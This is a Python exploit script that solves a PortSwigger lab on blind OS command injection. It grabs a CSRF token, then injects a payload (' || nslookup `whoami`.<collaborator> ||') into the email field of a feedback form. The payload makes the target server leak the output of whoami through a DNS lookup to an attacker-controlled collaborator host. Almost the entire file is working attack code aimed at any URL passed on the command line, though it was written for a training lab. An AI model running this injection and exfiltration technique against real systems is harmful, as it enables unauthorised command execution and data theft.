# Blind OS command injection with out-of-band data exfiltration

# https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token: %s' % csrf)
	return csrf

def run_nslookup(s, url, collab):
	submit_path = url + '/feedback/submit'
	feedback_path = url + '/feedback'
	command_injection = ' || nslookup `whoami`.%s ||' % collab
	print("[+] Extracting CSRF Token from the feedback page...")
	r = s.get(feedback_path)
	csrf_token = get_csrf_token(r)
	params = {'email': 'test@test.com' + command_injection, 'name': 'gwyo', 'subject': 'hacked', 'message': 'H4ck3d!!!', 'csrf': csrf_token}
	print(f"[+] Trying to run command '{command_injection}' on the target website...\n")
	res = s.post(submit_path, data=params)
	return res.status_code

def submit_username(s, url, username):
	print('[+] Trying to submit the username to solve the lab...')
	time.sleep(1)
	submit_path = url + '/submitSolution'
	submit_data = {"answer": username}
	r = s.post(submit_path, data=submit_data, allow_redirects=False)
	print(r.text)
	return r.text


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind OS command injection with out-of-band data exfiltration')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind OS command injection with out-of-band data exfiltration")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	parser.add_argument('-C',dest='collab',required=True, help="Collaborator URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	collab = args.collab
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to force the victim server to send a DNS request containing the output of the whoami command...\n')
			time.sleep(1)
			status = run_nslookup(s, url, collab)
			if status != 200:
				print('[-] The exploit failed to send the payload <!>')
				sys.exit(0)
			print('[+] Check your collaborator and grab the username (as prefix of your subdomain)')
			username = input('Username:\n> ')
			r = submit_username(s, url, username)
			if "false" in r:
				print('[-] The provided username is incorrect <!>')
				sys.exit(0)
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
